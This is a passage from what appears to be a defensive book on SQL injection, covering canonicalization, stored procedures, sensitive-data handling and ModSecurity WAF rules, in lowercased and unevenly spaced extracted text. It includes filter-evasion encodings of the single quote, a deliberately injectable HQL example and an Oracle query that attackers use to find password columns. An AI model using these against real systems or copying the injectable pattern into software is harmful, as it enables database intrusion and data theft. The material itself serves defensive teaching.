an external source—ei ther from another application within the organization or from a third -party source. an example behavior that can cause this is the use of parameterized statements. although parameterized statements are secure in that they prevent exploitation of sql inject ion by avoiding dynamic sql, they are often used instead of validating the input; as a result, the data stored within the database can contain malicious input from the user. in these cases, you must be careful when accessing the data in the database to avo id sql injection and other types of application security issues when the data is ultimately used or presented to the user. one example of an issue that commonly occurs when unsafe data is present in the database is xss. however, sql injection is also possi ble in this instance. we discussed this topic in more depth from an attacker’s point of view in chapter 7 , in “exploiting second -order injection.” therefore, you should always consider performing context -specific encod ing on the data you fetch from the database. examples would include encoding for xss issues before presenting content to the user’s browser, as well as encoding for sql injection characters, as discussed in the previous section, before using database conte nt in dynamic sql. canonicalization a difficulty with input validation and output encoding is ensuring that the data being evaluated or transformed is in the format that will be interpreted as intended by the end user of that input. a common technique for evading input validation and output encoding controls is to encode the input before it is sent to the application in such a way that it is then decoded and interpreted to suit the attacker’s aims. for example, table 8 .6 lists alternative ways to encode the single quote character. table 8.6 example single -quote representations representation type of encodin g %27 url encoding %2527 double url encoding %%317 nested double url encoding %u0027 unicode representation %u02b9 unicode representation %ca%b9 unicode representation ' html entity ' decimal html entity representation type of encodin g ' hexadecimal html entity %26apos; mixed url/html encoding in some cases, these are alternative encodings of the character ( %27 is the url -encoded representation of the single quote), and in other cases these are double -encoded on the assumption that the data will be explicitly decoded by the application ( %2527 when url decoded will be %27 as shown in table 8.6, as will %%317 ) or are various unicode representations, either valid or invalid. not all of these representations will be interpreted as a single quote normally; in mos t cases, they will rely on certain conditions being in place (such as decoding at the application, application server, waf, or web server level), and therefore it will be very difficult to predict whether your application will interpret them this way. for these reasons, it is important to consider canonicalization as part of your input validation approach. canonicalization is the process of reducing input to a standard or simple form. for the single -quote examples in t able 8.6, this would normally be a single -quote character (‘). canonicalization approaches so, what alternatives for handling unusual input should you consider? one method, which is often the easiest to implement, is to reject all input that is not already in a canonical format. for example, you can reject all html - and url -encoded input from being accepted by the application. this is one of the most reliable methods in situations where you are not expecting encoded input. this is also the approach that is often adopted by default when you do whitelist input validation, as you may not accept unusual forms of characters when validating for known good input. at the very least, this could involve not accepting the characters used to encode data (such as %, &, and # from the examples in table 8.6), and therefore not allowing these characters to be input. if rejecting input that can contain encoded forms is not possible, you need to look at ways to decode or otherwise make safe the input that you receive. this may include several decoding steps, such as url decoding and html decoding, potentially repeated several times. this approach can be error -prone, however, as you will need to perform a check after each decoding step to determine whether the input still contains encoded data. a more realistic approach may be to decode the input once, and then reject the data if it still contains encoded characters. this approach assumes that genuine input will not contain double -encoded va lues, which should be a valid assumption in most cases. working with unicode when working with unicode input such as utf -8, one approach is normalization of the input. this converts the unicode input into its simplest form, following a defined set of rules . unicode normalization differs from canonicalization in that there may be multiple normal forms of a unicode character according to which set of rules is followed. the recommended form of normalization for input validation purposes is nfkc (normalization form kc — compatibility decomposition followed by canonical composition). you can find more information on normalization forms at www.unicode.org/reports/tr15. the normalization process will decompose the unicode character into its representative components, and then reassemble the character in its simplest form. in most cases, it will transform double -width and other unicode encodings into their ascii equivalent s, where they exist. you can normalize input in java with the normalizer class (since java 6) as follows: normalized = normalizer.normalize(input, normalizer.form.nfkc); you can normalize input in c# with the normalize method of the string class as follows: normalized = input.normalize(normalizationform.formkc); you can normalize input in php with the pear::i18n_unicodenormalizer package from the pear repository, as follows: $normalized = i18n_unicodenormalizer::tonfkc($input, ‘utf- 8’); anot her approach is to first check that the unicode is valid (and is not an invalid representation), and then to convert the data into a predictable format —for example, a western european character set such as iso -8859 -1. the input would then be used in that f ormat within the application from that point on. this is a deliberately lossy approach, as unicode characters that cannot be represented in the character set converted to will normally be lost. however, for the purposes of making input validation decisions , it can be useful in situations where the application is not localized into languages outside western europe. you can check for unicode validity for utf -8 encoded unicode by applying the set of regular expressions shown in table 8.7. if the input matches any of these conditions it should be a valid utf -8 encoding. if it doesn’t match, the input is not a valid utf -8 encoding and should be rejected. for other types of unicode, you should consult the documentation for th e framework you are using to determine whether functionality is available for testing the validity of input. table 8.7 utf -8 parsing regular expressions regular expression descriptio n [x00-\\x7f] ascii [\\xc2-\\xdf][\\x80-\\xbf] two-byte representation \\xe0[\\xa0-\\xbf][\\x80-\\xbf] two-byte representation [\\xe1-\\xec\\xee\\xef][\\x80-\\xbf]{2} three- byte representation \\xed[\\x80-\\x9f][\\x80-\\xbf] three- byte representation \\xf0[\\x90-\\xbf][\\x80-\\xbf]{2} planes 1 –3 [\\xf1-\\xf3][\\x80-\\xbf]{3} planes 4 –15 \\xf4[\\x80-\\x8f][\\x80-\\xbf]{2} plane 16 now that you have checked that the input is validly formed, you can convert it to a predictable format —for example, converting a unicode utf -8 string to another character set such as iso -8859- 1 (latin 1). in java, you can use the charsetencoder class, or the simpler string method getbytes() (java 6 and later) as follows: string ascii = utf8.getbytes(“iso- 8859-1”); in c#, you can use the encoding.convert class as follows: byte[] asciibytes = encoding.convert(encoding.utf8, encoding.ascii, utf8bytes); in php, you can do this with utf8_decode as follows: $ascii = utf8_decode($utf8string); design techniques to a void the dangers of sql injection the material in the solutions i’ve described in this chapter comprises patterns that you can use to secure your applications against sql injection, and in most cases they are techniques you can apply to both an application under development and an existing application, albeit with some rework to the original application’s architecture. this solution is intended to provide a number of higher -level design techniques to avoid or mitigate the dangers of sql injection. being at the design level, however, these techniques are more beneficial to new development, as significantly rearchitecting an existing application to incorporate different design techniques could require a great deal of effort. each design technique we’ll discuss in the subsections that follow can be implemented in isolation; however, for best results it is recommended that you implement all of these techniques together with the techniques outlined earlier in the chapter, where appropriate, to provide true defense in depth against sql injection vulnerabilities. using stored procedures one design technique that can prevent or mitigate the impact of sql injection is to design the application to exclusively use stored procedures for accessing the database. stored proc edures are programs stored within the database, and you can write them in a number of different languages and variants depending on the database, such as sql (pl/sql for oracle, transact sql for sql server, and sql:2003 standard for mysql), java (oracle), or others. stored procedures can be very useful for mitigating the seriousness of a potential sql injection vulnerability, as it is possible to configure access controls at the database level when using stored procedures on most databases. this is important, because it means that if an exploitable sql injection issue is found, the attacker should not be able to access sensitive information within the database if the permissions are correctly configured. this happens because dynamic sql, due to its dynamic n ature, requires more permissions on the database than the application strictly needs. as dynamic sql is assembled at the application, or elsewhere in the database, and is then sent to the database for execution, all data within the database that needs to be readable, writable, or updateable by the application needs to be accessible to the database user account that is used to access the database. therefore, when an sql injection issue occurs, the attacker can potentially access all of the information within the database that is accessible to the application, as the attacker will have the database permissions of the application. with the use of stored procedures, you can change this situation. in this case, you would create stored procedures to perform all of the database access the application needs. the database user that the application uses to access the database is given perm issions to execute the stored procedures that the application needs, but does not have any other data permissions within the database (i.e. the user account does not have select , insert , or update rights to any of the application’s data, but does have execute rights on the stored procedures). the stored procedures then access the data with differing permissions —for example, the permissions of the user who created the procedure rather than the user invoking the procedure —and can interact with the application data as necessary. this can help you to mitigate the impact of an sql injection issue, as the attacker will be limited to calling the stored procedures, therefore limiting the data the attacker can access or modify, and in many cases preventing the attack er from accessing sensitive information in the database . damage & defense... sql injection in stored procedures it is often assumed that sql injection can happen only at the application level —for example, in a web application. this is incorrect, as sql injec tion can occur at any level where dynamic sql is used, including at the database level. if unsanitized user input is submitted to the database— for example, as a parameter to a stored procedure —and then it is used in dynamic sql, sql injection can occur at the database level as easily as at any other level. therefore, you should be careful when handling untrusted input at the database level, and you should avoid dynamic sql wherever possible. in situations where stored procedures are in use, the use of dynam ic sql can often indicate that additional procedures should be defined at the database level to encapsulate missing logic, therefore enabling you to avoid the use of dynamic sql within the database at all. using abstraction layers when designing an enterpr ise application it is a common practice to define various layers for presentation, business logic, and data access, allowing the implementation of each layer to be abstracted from the overall design. depending on the technology in use, this may involve an additional data access abstraction layer such as hibernate, activerecord, or entity framework. for many of these frameworks developers will not have to write a single line of sql in the application. another type of abstraction layer is to use a database ac cess framework such as ado.net, jdbc, or pdo. both of these layers of abstraction can be a very useful place for the security -aware designer to enforce safe data access practices that will then be used throughout the rest of the architecture. a good exampl e of this would be a data access layer that ensures that all database calls are performed through the use of parameterized statements. examples of using parameterized statements in a number of technologies (including those mentioned earlier) are provided i n “using parameterized statements” earlier in this chapter. providing that the application did not access the database in any way other than the data access layer, and that the application did not then use the supplied information in dynamic sql at the dat abase level itself, sql injection is unlikely to be present. even more powerful would be to combine this method of accessing the database with the use of stored procedures, as this would mitigate the risk even further. this may also have the effect of easi ng implementation of a secure database layer, as in that case all of the methods of accessing the database will have been defined, and would therefore be easier to implement in a well- designed data access layer . damage & defense... query languages provided b y abstraction layers some abstraction layers introduce their own query languages and these constructs may also be subject to injection attacks. as an example hibernate has a query language called hql. the developer can create complex queries using hql, joi ning data from several tables and filtering based on data. the following is a simple example written in java: session.createquery(“from users u where u.username = ’” + username + “’”) the code in this example is clearly injectable using single quotes. as explained in the parameterized statements section however, parameterized queries are available also when using hql. when can use named parameters in our query and set their values in the following statements: query query = session.createquery(“from users user where user.username =:username”); query.setstring(“username”, username); list results = query.list(); in this example we allow the hibernate framework to encode that data for us —just like when using parameterized statements with sql. handling sensitive data a final technique for mitigating the seriousness of sql injection is to consider the storage and access of sensitive information within the database. one of the goals of an attacker is to gain access to the data that is held within the database—often because that data will have some form of monetary value. examples of the types of information an attacker may be interested in obtaining may include usernames and passwords, personal information, or financial information such as credit card details. becaus e of this, it is worth considering additional controls over sensitive information. some example controls or design decisions to consider might be the following: • passwords: where possible, you should not store users’ passwords within the database. a more secure alternative is to store a salted one- way hash (using a secure hash algorithm such as sha256) of each user’s password instead of the password itself. the salt, which is an additional small piece of random data, should then ideally be stored separately from the password hash. in this case, instead of comparing a user’s password to the one in the database during the login process, you would compare the salted hash calculat ed from the details supplied by the user to the value stored in the database. note that this will prevent the application from being able to e -mail the user his existing password when he forgets it; in this case, it would be necessary to generate a new, secure password for the user and provide that to him instead. • credit card and other financial information: you should store details such as credit cards encrypted with an approved (i.e. fips -certified) encryption algorithm. this is a requirement of the pay ment card industry data security standards (pci -dss) for credit card information. however, you should also consider encrypting other financial information that may be in the application, such as bank account details. the encryption key should not be stored in the database. • archiving: where an application is not required to maintain a full history of all of the sensitive information that is submitted to it (e.g. personally identifiable information), you should consider archiving or removing the unneeded information after a reasonable period of time. where the application does not require this information after initial processing, you should archive or remove unneeded information immediately. in this case, removing information where the exposure would be a m ajor privacy breach may reduce the impact of any future security breach by reducing the amount of customer information to which an attacker can gain access. notes from the underground... notes from an incident response one of the more interesting incident response engagements an author of this book was involved with was with a fairly large regional bank in the northeast region of the united states. the client (a bank) had noticed that something odd was going on when their server administrator saw that the logs for one day were several times larger than they normally expected. as such, they looked into it, and fairly quickly determined that they were the victims of an sql injection exploit. in this case, the exploit vector was fairly innocuous —it was an identif ier that the application used to determine which press release the user wanted to read in the “news” section of the web site. unfortunately for the client, the press release detail was not the only information stored in that database. also stored in that d atabase were the mortgage application details of every customer of the bank who had applied for a mortgage through the web site, including full names, social security numbers, phone numbers, address history, job history, and so forth—in other words, everyt hing needed for identity theft, for almost 10,000 customers. the bank in question ended up writing to every one of its customers to apologize, and also provided all of the affected customers with complimentary identity theft protection. but had the bank pa id some attention to where its sensitive information was stored before the exploit happened the exploit probably would not have been nearly as serious as it was. avoiding obvious object names for security reasons, you should be careful with your choice of names for critical objects such as encryption functions, password columns, and credit card columns. most application developers will use obvious column names, such as password, or a translated version such as kennwort (in german). on the other side, most a ttackers are aware of this approach and will search for interesting columns names (such as password) in the appropriate views of the database. here’s an example on oracle: select owner||‘.’||column_name from all_tab_columns where upper(column_name)like ‘%passw%’) the information from the table containing passwords or other sensitive information will be selected in the next step of the attack. to see some examples of the types of naming to avoid, refer to table 8.8, which lists common variations and translations for the word password. table 8.8 password in different languages word for password language password, pwd, passw english passwort , kennwort german motdepasse , mdp french wachtwoord dutch senha portuguese word for password language haslo polish to make the attack more difficult, it could be a good idea to use an unobvious table and column name for saving password information. although this technique will not stop an attacker from finding and accessing the data, it will ensure that the attacker wi ll not be able to identify this information immediately. setting up database honeypots to become alerted if someone tries to read the passwords from the database, you could set up an additional honeypot table with a password column that contains fake data. if this fake data were selected, the administrator of the application would receive an e- mail. in oracle, you could implement such a solution by using a virtual private database (vpd), as in the following example: -- create the honeypot table create table app_user.tblusers (id number, name varchar2(30), passwordvarchar2(30)); -- create the policy function sending an e -mail to the administrator -- this function must be created in a different schema, e.g., secuser create or replace secuser.function get_cust_id (p_schema in varchar2, p_table in varchar2 )return varchar2 asv_connection utl_smtp.connection; begin v_connection:= utl_smtp.open_connection(‘mailhost.victim.com’,25); utl_smtp.helo(v_connection,‘mailhost.victim.com’); utl_smtp.mail(v_connection,‘app@victim.com’); utl_smtp.rcpt(v_connection,‘admin@victim.com’); utl_smtp.data(v_connection,‘warning! select performed on honeypot’); utl_smtp.quit(v_connection); return ‘1=1’; -- always show the entire table end; / -- assign the policy function to the honeypot table tblusers exec dbms_rls.add_policy (‘app_user’, ‘tblusers’, ‘get_cust_id’, ‘secuser’, ”, ‘select,insert,update,delete’); additional secure development resources a number of resources exist to promote secur e applications by providing tools, resources, training, and knowledge to the developers writing those applications. the following is a list of the resources the authors of this book feel are the most useful: • the open web application security project (owa sp; www.owasp.org) is an open community promoting web application security. owasp has a number of projects that provide resources, guides, and tools to assist developers in understanding, finding, and addressing securit y issues in their code. notable projects are the enterprise security api (esapi), which provides a collection of api methods for implementing security requirements such as input validation, and the owasp development guide, which provides a comprehensive gu ide for secure development. • the 2009 cwe/sans top 25 most dangerous programming errors (http://cwe.mitre.org/top25/index.html ) is a collaboration among mitre, the sans institute, and a number of top s ecurity experts. it is intended to serve as an educational and awareness tool for developers, and provides a lot of detail on the top 25 programming errors as defined by the project —one of which is sql injection. • the sans software security institute ( www.sans -ssi.org ) provides training and certification in secure development, as well as a large amount of reference information and research contributed by sans certified individuals. • oracle’s tutorial on defending against sql injection attacks ( http://stcurriculum.oracle.com/tutorial/sqlinjection/index.htm) walks you through the tools and techniques for securing yourself against sql injec tion. • sqlsecurity.com ( www.sqlsecurity.com ) is a site dedicated to microsoft sql server security, and contains resources for tackling sql injection as well as other sql server security problems. • red -database- security ( www.red -database -security.com ) is a company specializing in oracle security. its site has a large number of presentations and white papers on oracle security available for download. • pete finne gan limited ( http://petefinnigan.com ) also provides a large amount of information for securing oracle databases. summary in this chapter, we examined several recommended techniques for securing an application against sql injection. these techniques can all be effective in mitigating part of the problem; however, you will likely need to implement several of the techniques in this chapter to ensure effective protection. for this reason, you should look at all of the solutions presented and determine where you can integrate them into your application. if you cannot integrate a particular solution, determine whether there is an additional technique that you can use to provide the coverage you seek. remember that each technique we discussed in this chapter should represent only one part of your defense -in-depth strategy for protecting your application at each level. consider where you will use whitelist input validation with the application’s input gathering, where you will use output encoding between layers and before the database, how you will encode information coming from the database, how you will be canonicalizing and/or norma lizing data before validating it, and how data access to the database will be architected and implemented. all of these combined will keep you secure from sql injection. solutions fast track domain driven security • sql injection occurs because our application is mapping data incorrectly between different representations of the data. • by wrapping our data in validated value objects, and limiting access to raw data, we can enforce correct usage of the data. using para meterized statements • dynamic sql, or assembling an sql query as a string containing user -controllable input and then submitting it to the database, is the primary cause of sql injection vulnerabilities. • you should use parameterized statements (also known as prepared statements) instead of dynamic sql to assemble an sql query safely. • you can use parameterized statements only when you’re supplying data; you cannot use them to supply sql keywords or identifiers (such as table or column names). validating input • always use whitelist input validation (accepting only the “known good” input you are expecting) where possible. • ensure that you validate the type, size, range, and content of all user -controllable input to the application. • use blacklist input validation (rejecting “known bad” or signature –based input) only when you cannot use whitelist input validation. • never use blacklist input validation on its own. always combine it with output encoding at the very least. encoding output • ensure that sql queries containing user -controllable input are encoded correctly to prevent single quotes or other characters from altering the query. • if you’re using like clauses, ensure that like wildcards are appropriately encoded. • ensure that data received from th e database undergoes appropriate context -sensitive input validation and output encoding prior to use. canonicalization • input validation filters and output encoding should be performed after input has been decoded or is in canonical form. • be aware that there are multiple representations of any single character, and multiple ways to encode it. • where possible, use whitelist input validation and reject non- canonical forms of input. designing to avoid the dangers of sql injection • use stored procedures so that you can have more granular permissions at the database level. • you can use a data access abstraction layer to enforce secure data access across an entire application. • consider additional controls over sensitive information at design time. frequent ly asked questions q: why can’t i use parameterized statements to supply table or column names? a: you can’t supply sql identifiers in a parameterized statement, as these are compiled at the database and then filled in with the supplied data. this requires the sql identifiers to be present at compile time, before the data is supplied. q: why can’t i have a parameterized order by clause? a: this is for the same reason as for the previous question, as an order by contains an sql identifier, namely the column to order by. q: how do i use parameterized statements in x technology with y database? a: the majority of modern programming languages and databases support parameterized statements. try looking at the document ation of the database access api you are using. remember that these are sometimes referred to as prepared statements. q: how do i parameterize a stored procedure call? a: in most programming languages, this is very similar to or the same as using a paramet erized statement. try looking at the documentation of the database access api you are using. these may be referred to as callable statements. q: where can i get a good blacklist for validating x? a: unfortunately, what you would need to put in the blacklis t will be specific to the context of your application. also, you shouldn’t use blacklists, if possible, because you cannot blacklist every potential attack or malicious input. if you must use blacklists, make sure you use output encoding as well, or that y ou are using blacklist input validation as only one of your validation approaches. q: so, if i use whitelist input validation, am i safe? a: no. it depends on what you’re allowing through. for example, you may allow single quotes to be input, which will cr eate issues if that input is included in dynamic sql. q: where are good places to use whitelist input validation? blacklist input validation? a: you should use whitelist input validation in the application at the point the input is accepted, allowing you t o apply context -sensitive validation at that point. a good place to have blacklist validation is as an additional control at a web application firewall or similar to enable you to detect obvious sql injection hacking attempts. q: so, i need to encode input to the database and from it as well? why? a: if you’re using dynamic sql anywhere, you need to ensure that the content you are submitting to the database will not cause an sql injection issue. this doesn’t mean that malicious content has been rendered saf e, though. it could be dangerous when queried from the database and used in dynamic sql elsewhere. q: at what point should i encode? a: you should encode close to where you use the information. therefore, you should encode when submitting information to th e database before it goes to the database. you should encode information that comes from the database as close to where it is used as possible; for example, before being presented to the user (encode for cross -site scripting), or before it is used in dynam ic sql (encode for sql injection). q: how do i perform canonicalization/normalization on input i’ve received in technology x? a: refer to your documentation of the framework in which you’re developing for canonicalization and normalization support. alterna tively, you could consider using an external framework such as icu for normalization or iconv to convert the input to ascii if no other support is available. q: why is unicode so complex with canonicalization? a: unicode allows a character to be represented in a multiple -byte form. because of the way unicode is generated, it is possible for there to be multiple representations of the same character. it is also possible in cases where an out -of-date or badly implemented unicode interpreter is used, that addi tional invalid presentations of a character may also work. q: i can use dynamic sql in a stored procedure, can’t i? a: yes. but be aware that you can have sql injection in stored procedures as well. if you have user -controllable information being included in a dynamic sql query in a stored procedure, you will be vulnerable. q: i use hibernate, so i’m safe from sql injection, right? a: wrong. hibernate does encourage secure database access behavior, but it is still possible to create sql injectable code in h ibernate, especially where you’re using native queries. avoid dynamic sql, and make sure you’re using parameterized statements with bound variables. chapter 9 platform level defenses justin clarke solutions in this chapter: • using runtime protection • securing the database • additional deployment considerations introduction in chapter 8, we discussed practices and defenses that you can employ at the code level to prevent sql injection. in this chapter, we’ll shift our focus to platform -level defenses that detect, mitigate, and prevent sql injection. a platform -level defense is any runtime enhancement or configuration change that can be made to increase the application’s overall security. the scope of protection we’ll cover in this chapter varies; however, as a whole the techniques we’ll discuss can help you to achieve a multi -layered security architecture. first we’ll examine runtime protection technologies and techniques, such as web server plug-ins and leveraging application framework features. we’ll follow this with strategies for securing the data in the database, as well as the database itself, to help reduce the impact of exploitable sql injection vulnerabilities. lastly, we’ll look at what you can do at the infrastructure level to reduce the threat. it is important to remember that the solutions discussed in this chapter are not a substitute for writing secure code, but are complementary. a hardened database does not stop sql injection, but can make it significan tly more difficult to exploit, as well as helping to mitigate the likely impact of the exploit. a web application firewall or database firewall can serve as a virtual patch between vulnerability detection and code correction, as well as serving as a formid able defense against zero -day threats, such as automated mass -sql injection attacks that can infect hundreds or thousands of web sites in a few days. platform -level security is an important component to the overall security strategy for both existing and new applications. using runtime protection in this section, we’ll consider runtime protection to be any security solution that you can use to detect, mitigate, or prevent sql injection that is deployable without recompiling the vulnerable application’s sour ce code. the solutions covered here are primarily software plug ins for web servers and application frameworks (e.g. the .net framework, j2ee, php, etc.) or techniques for leveraging/extending features of the web or application platform. the software solut ions we’ll discuss are open- source or free and are available for download on the internet. we will not cover commercial products, although there are a number of commercial solutions available that implement one or more of the strategies and techniques disc ussed here and in most cases will have support and management options that may make them better options for enterprise environments. runtime protection is a valuable tool for mitigating and preventing exploitation of known sql injection vulnerabilities. fixing the vulnerable source code is always the ideal solution; however, the development effort required is not always feasible, practical, cost -effective, or unfortunately a high priority. commercial off -the-shelf (cots) applications are often purchased in compiled format, which eliminates the possibility of fixing the code. even if uncompiled code is available for a cots application, customizations may violate support contracts and/or prevent the software vendor from providing updates according to its norma l release cycle. legacy applications close to retirement may not warrant the time and effort required to make the necessary code changes. organizations may intend to make a code change, but don’t have the resources in the near term to do so. these common s cenarios highlight the need for runtime protection in the form of virtual patching or band- aid solutions. even if the time and resources are available for code fixes, runtime protection can still be a valuable layer of security to detect or thwart exploita tion of unknown sql injection vulnerabilities. if the application has never undergone security code review or penetration testing, application owners might not be aware of the vulnerabilities. there is also the threat of “zero -day” exploit techniques as we ll as the latest and greatest sql injection worm traversing the internet. in this way, runtime protection is not just a reactive defense mechanism, but also a proactive step toward comprehensively securing an application. although runtime protection provides many benefits, you need to consider some of the costs that may be involved. depending on the solution, you should expect some level of performance degradation (as you would expect anytime additional processing and overhead are incurred). when evaluating a solution, especially a commercial one, it is important to ask for documented performance statistics. the other point of caution is that some runtime solutions are more difficult to configure than others. if the solution is overly complex, the time and resources spent getting it to work may exceed the costs of actually fixing the code, or worse yet, you may decide not to use it at all. ensure that the solution you select comes with detailed installation instructions, configuration examples, and support (t his doesn’t always mean paid support; some free solutions provide good online support through forums). the key to getting the most out of runtime protection is a willingness to learn the limitations of the technology and evaluate how it can best help you. web application firewalls the most well- known runtime solution in web application security is the use of a web application firewall (waf). a waf is a network appliance or software -based solution that adds security features to a web application. specificall y, we’re focusing on what wafs can offer in terms of sql injection protection. software -based wafs are typically modules embedded into the web server or application with minimal configuration. primary benefits of software -based wafs are that the web infras tructure remains unchanged, and http/https communications are handled seamlessly because they run inside the web- or application- hosting process. appliance -based wafs don’t consume web server resources and they can protect multiple web applications of vary ing technologies. we will not cover network appliances any further, although you can use some of the software solutions as a network appliance when running on a web server configured as a reverse proxy server. notes from the underground... need help evaluati ng a waf? unfortunately, the usefulness of wafs is sometimes criticized; however, the criticism is usually targeted at a specific implementation or commercial product. regardless of how you feel about wafs, they will be a mainstay of web application securi ty, especially as standard bodies such as the payment card industry (pci) are endorsing them as an option to satisfy requirement 6.6. to help evaluate the various characteristics of a potential waf solution, the web application security consortium (wasc) published the “web application firewall evaluation criteria” (wafec) document (www.webappsec.org/projects/wafec/ ). this provides a good start point for beginning your evaluation of a waf solution. using modsecurity the de facto standard for wafs is the open source modsecurity ( www.modsecur ity.org/ ). modsecurity is implemented as an apache module; however, it can protect virtually any web application (even asp and asp.net web applications) when the apache web server is configured as a reverse proxy. you can use modsecurity for attack prevent ion, monitoring, intrusion detection, and general application hardening. we will use modsecurity as the primary example for discussing key features in detecting and preventing sql injection when using a waf. configurable rule set web application environments are unique, and wafs must be highly configurable to accommodate a wide variety of scenarios. the strength of modsecurity is its rule language, which is a combination of configuration directives and a simple programing language applied to http requests a nd responses. the outcome is usually a specific action, such as allowing the request to pass, logging the request, or blocking it. before looking at specific example, let’s first look at the generic syntax of the modsecurity directive secrule , as shown in figure 9.1. figure 9.1 generic syntax for secrule the variable attribute tells modsecurity where to look in the request or response, operator tells modsecurity how to check this data, and actions determines what to do when a match occurs. the actions attribute is optional for a rule, as default global actions can be defined. you can configure modsecurity rules to achieve a negative (i.e. blacklist) or positive (i.e. whitelist) security model when handling http request data. let’s look at figure 9.2, which is an actual blacklis t sql injection rule from the generic attacks rule file (modsecurity_crs_41_sql_injection_attacks.conf) of the modsecurity core rule set. the following bullets walk you through the rule and describe each configuration directive. for additional information on modsecurity directives, refer to the official modsecurity documentation at www.modsecurity.org/documentation/ . • the rule is a security rule ( secrule), which is used to analyze data and perform a ctions based on the results. • the rule will be applied to the request body ( phase:2). the specific targets for analysis on the request body are the request path ( request_filename), all request parameter values including post data ( args ), the request param eter names ( args_names ), all cookies included in the request ( request_cookies ), the cookie names (request_cookies_names ), and all xml content included in the request ( xml:/∗). • each target is matched against the regular expression pattern. note that captu ring ( capture ) has been enabled for this regular expression. this means data that matches the pattern in parentheses will be later accessible with substitution variables 0–9. • prior to the match, the request data is first subject to a number of translatio ns (denoted by the t: syntax), to help decode evasive encodings employed by the attacker. the first is t:none , which clears all previously set translation functions from previous rules, and the last is t:replacecomments , which replaces c -style comments (e.g. / ∗ comment ∗/) with a single space. the in -between translation functions should be self -explanatory (refer to “ request normalization ” for more information about data translations). • modsecurity is instructed that for this rule the response body will also be logged (ctl:auditlogparts=+e ). • next, a successful match of the rule will result in the request being blocked ( block ). a message indicating that this is an sql injection attack is added to the rule ( msg:‘sql injection attack’ ) as well as a number of tags to classify the attack category in the log (tag:‘web_attack/sql_injection’ through tag:‘pci/6.5.2’ ). additionally, part of the matched data will also be logged ( logdata: ‘%{tx.0}’ ) via the capturing feature previo usly mentioned. all data is properly escaped before logging to avoid log -forging attacks. • successful matches are considered critical ( severity: ‘2’ ). • successful matches will also increment or set a number of variables used within the modsecurity core r ule set to track anomaly matches against thresholds set by the user. • the rule is also assigned a unique id ( id:‘959052’ ) figure 9.2 sql injection rule from the generic attacks rule file the modsecurity core rule set includes blacklist rules for sql injection and blind sql injection, which, depending on the application, could generate false positives. therefo re, the default behavior for these rules is increment anomaly scores that are used to track the prevalence of matched rules. in this way, the user can set anomaly thresholds that are appropriate to the application in order to avoid blocking legitimate requ ests with the out -ofthe-box rule set. this allows us to minimize instances of possible false positives without affecting normal application behavior and tune the rules so that we are comfortable setting them to block should we be faced with a zero- day thr eat. false positives are not unique to modsecurity; all wafs will generate false positives if they are not properly tuned. modsecurity’s core rule set default behavior is preferable, as you want to monitor application behavior and tune rules and thresholds before turning on active protection in production environments. if you are using modsecurity to patch a known vulnerability, you can build a custom rule set that achieves positive security (whitelisting). figure 9.3 shows a custom whitelist rule that you can use to apply a virtual patch to a php script. requests to script.php must contain one parameter named statid and the value must be a numerical value from one to three digits long. with this patch in place, exploit ation of a sql injection vulnerability via the statid parameter would not be possible. figure 9.3 whitelist rule to patch a vulnerable php script request coverage sql injection protection can be very tricky for a waf. attack payloads can manifest themselves virtually anywhere within an http request, such as the querystring, post data, cookies, custom and standard http headers (e.g. referer, server, etc.), or even parts of the url path. modsecurity can handle any of these scenar ios. figure 9.4 is an example list of variables (i.e. targets for analysis) that modsecurity supports. this should give you an idea of the comprehensive request -level protection that modsecurity provides and that a wa f must implement to adequately protect against sql injection. figure 9.4 modsecurity request variables request normalization attack strings can be encoded in a variety of ways to avoid detection and easily defeat simple input validation filters. modsecurity is capable of handling virtually any complex encoding scenario, as it supports a wide variety of transfor mation functions and can apply those functions multiple times per rule and in any order. figure 9.5 shows a list of transformation functions from the modsecurity reference manual. figure 9.5 modsecurity transformation functions if for some reason built -in functions don’t meet your needs, you can build custom transformation functions via modsecurity’s support for the lua scripting language. response analysis another key feature of a waf when it comes to mitigating sql injection i s the ability to suppress key information leakage, such as detailed sql error messages. refer to figure 9.6, which is an actual outbound rule from the outbound rule file (modsecurity_crs_50_outbound.conf) of the modse curity core rule set. figure 9.6 sql errors leakage rule from the outbound rule file if the message in the response successfully matches against the regular expression (indicating that an sql error has occurred), modsecurity can respond appropriately, including responses such as suppressing the error from being returned to the attack or supplying an alternative error code or message in order to confuse automated clients or scanners. this type of response analysis and error suppression does not eliminate the sql injection vulnerability or help in the case of blind sql injection, but it is still an important defense -indepth security mechanism. intrusion detection capabilities lastly, wafs should be able to monitor application behavior passively, take action in the event of suspicious behavior, and maintain a log of events that cannot be repudiated for a forensic analysis following an sql injection incident. the logs should give you the information to determine whether your application was attacked and provide enough information for reproducing the attack string. blocking and rejecting malicious input aside, the ability to add intrusion detection features to your application without changing a line of code is a strong argument for the use of wafs. when performing a forensic analysis following an sql injection incident, nothing is more frustrating than having to rely on web server log files, which often contain only a small subset of the data sent in the request. in summary, with modsecurity it is possible to stop sql injection attacks, patch a known sql injection vulnerability, detect attack attempts, and suppress sql error messages that often facilitate exploitation of sql injection vulnerabilities. now that we’ve discussed modsecurity and wafs in general, we’re going to look at some solutions that could be considered a waf but are not as robust. however, they can be just as effective depending on the scenario, and they can be potentially cheaper in cost and resource requirements to deploy. tools and traps modsecurity has become the standard for open source wafs, however as modsecurity is tightly integrated to the apache web server, this can limit its flexibility. one up and coming project to keep an eye on in the future is ironbee ( www.ironbee.com ). this is a new open source waf project lead by the original developer of modsecurity, ivan ristić, which aims to overcome many of the difficulties of using modsecurity, including supporting multiple web server platforms. intercepting filters most wafs implement the intercepting filter pattern or include one or more implementations in their overall architecture. filters are a series of independent modules that you can chain together to perform processing before and after the core processing of a requested resource (web page, url, script, etc.). filters do not have explicit dependencies on each other; this allows you to add new filters without affecting existing filters. this modularity makes filters reusable across applications. you can add filt ers to applications at deployment when implemented as a web server plug -in or when activated dynamically within an application configuration file. filters are ideal for performing centralized, repeatable tasks across requests and responses that are loosely coupled with core application logic. they are also good for security functions such as input validation, request/response logging, and transforming outgoing responses. in the next two sections, we’re going to look at two common filter implementations: web server plug-ins and application framework modules. you can use both of them for runtime sql injection protection. figure 9.7 shows where each is executed as the http request and response passes to/from the web browse r. figure 9.7 diagram depicting web server and application filters web server filters you can implement fi lters as web server modules/plug -ins, which extend the core request and response handling application program interface (api) of the web server platform. basically, requests and responses handled by the web server pass through a series of phases, and modul es can be registered to execute at each phase. web server modules permit customized handling of a request before the request reaches the web application and after it has generated a response. all of this occurs independently of other web server modules tha t might be registered and independently of the web application’s underlying logic. this feature makes web server modules a good implementation choice for filters. popular web server platforms such as apache, oracle/sun 